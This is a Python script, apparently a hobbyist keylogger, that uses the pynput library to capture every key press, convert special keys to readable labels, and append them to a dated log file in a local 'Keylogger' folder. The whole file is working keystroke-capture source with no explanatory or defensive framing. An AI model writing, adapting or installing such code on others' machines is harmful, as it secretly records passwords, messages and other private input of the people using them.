from pynput.keyboard import Listener
import time

date=time.localtime().tm_mday,time.localtime().tm_mon,time.localtime().tm_year
today=str(date[0])+'-'+str(date[1])+'-'+str(date[2])

def writeTofile(key):
    letter=str(key)
    letter=letter.replace("'","")
    if letter == 'Key.shift_r':
        letter=''
    if letter == 'Key.shift':
        letter=''
    if letter == 'Key.space':
        letter=' Space(key) '
    if letter == 'Key.enter':
        letter=' enter\n'
    if letter == 'Key.down':
        letter=''
    if letter == 'Key.up':
        letter=''
    if letter == 'Key.left':
        letter=''
    if letter == 'Key.right':
        letter=''
    if letter == 'Key.ctrl_l': letter=' ctrl\n'
    if letter == 'Key.alt_l': letter=' alt\n'
    if letter == 'Key.caps_lock': letter=' CapsLock '
    if letter == 'Key.tab': letter=' Tab(Button)\n'
    if letter == 'Key.backspace': letter=' Backspace(Button) '
    if letter == 'Key.cmd': letter=' windowsButton\n'
    if letter == 'Key.esc': letter=' Esc(Button)'
    if letter == 'Key.media_volume_mute': letter=' volume_mute(F1)\n'
    if letter == 'Key.media_volume_down': letter=' volume_down(F2)\n'
    if letter == 'Key.media_volume_up': letter= ' volume_up(F3)\n'
    if letter == 'Key.media_previous': letter=' media_previous(F4)\n'
    if letter == 'Key.media_play_pause': letter=' media_play_pause(F5)\n'
    if letter == 'Key.media_next': letter=' media_next(F6)\n'
    if letter == '<170>': letter=' F9(Button)\n'
    if letter == 'Key.print_screen': letter=' PrtScr\n'
    if letter == '<255>': letter=' F11_or_F12(Button)\n'
    if letter == 'Key.delete': letter=' Delete\n'
    if letter == 'Key.f1': letter=' F1(Button)\n'
    if letter == 'Key.f2': letter=' F2(Button)\n'
    if letter == 'Key.f3': letter=' F3(Button)\n'
    if letter == 'Key.f4': letter=' F4(Button)\n'
    if letter == 'Key.f5': letter=' F5(Button)\n'
    if letter == 'Key.f6': letter=' F6(Button)\n'
    if letter == 'Key.f7': letter=' F7(Button)\n'
    if letter == 'Key.f8': letter=' F8(Button)\n'
    if letter == 'Key.f9': letter=' F9(Button)\n'
    if letter == 'Key.f10': letter=' F10(Button)\n'
    if letter == 'Key.f11': letter=' F11(Button)\n'
    if letter == 'Key.f12': letter=' F12(Button)\n'
    if letter == 'Key.insert': letter=' Insert(Button)\n'
    if letter == 'Key.page_up': letter=' PageUp(Button)\n'
    if letter == 'Key.page_down': letter=' PageDn(Button)\n'
    if letter == 'Key.home': letter=' Home(Button)\n'
    if letter == 'Key.end': letter=' End<(Button)\n'
    if letter == 'Key.num_lock': letter=' Num_Lock(Button)\n'
    if letter == '<110>': letter='.'
    if letter == '<96>': letter='0'
    if letter == '<97>': letter='1'
    if letter == '<98>': letter='2'
    if letter == '<99>': letter='3'
    if letter == '<100>': letter='4'
    if letter == '<101>': letter='5'
    if letter == '<102>': letter='6'
    if letter == '<103>': letter='7'
    if letter == '<104>': letter='8'
    if letter == '<105>': letter='9'
    with open('C:/Users/divyansh/Desktop/Keylogger/LOG FILES/'+today+'.txt','a') as f:
        f.write(letter)



with Listener(on_press=writeTofile) as l:
    l.join()

        

